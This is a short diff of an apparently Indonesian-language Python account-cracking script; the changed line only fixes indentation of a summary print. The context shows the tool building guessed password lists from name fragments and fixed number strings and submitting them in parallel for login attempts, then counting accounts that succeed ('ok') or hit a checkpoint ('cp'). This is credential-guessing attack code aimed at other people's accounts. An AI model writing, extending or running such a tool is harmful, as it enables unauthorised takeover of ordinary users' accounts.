@@ -59,7 +59,7 @@ def Main_Menu():
             b = next[:6]  
             pasw = [mk,xx,'57273200',v,'57575751','57575752']
             MethodCrack.submit(Async,user,pasw)
-	print('\n'); Console().print(f'[bold #FFFFFF] > crack [bold #00FF00]{len(id)}[bold #FFFFFF] email selesai | akun ok:[bold #00FF00]{ok} [bold #FFFFFF]akun cp:[bold #FFFF00]{cp}'); exit()
+    print('\n'); Console().print(f'[bold #FFFFFF] > crack [bold #00FF00]{len(id)}[bold #FFFFFF] email selesai | akun ok:[bold #00FF00]{ok} [bold #FFFFFF]akun cp:[bold #FFFF00]{cp}'); exit()
 
 def Async(user, pasw):
 	ses = requests.Session()
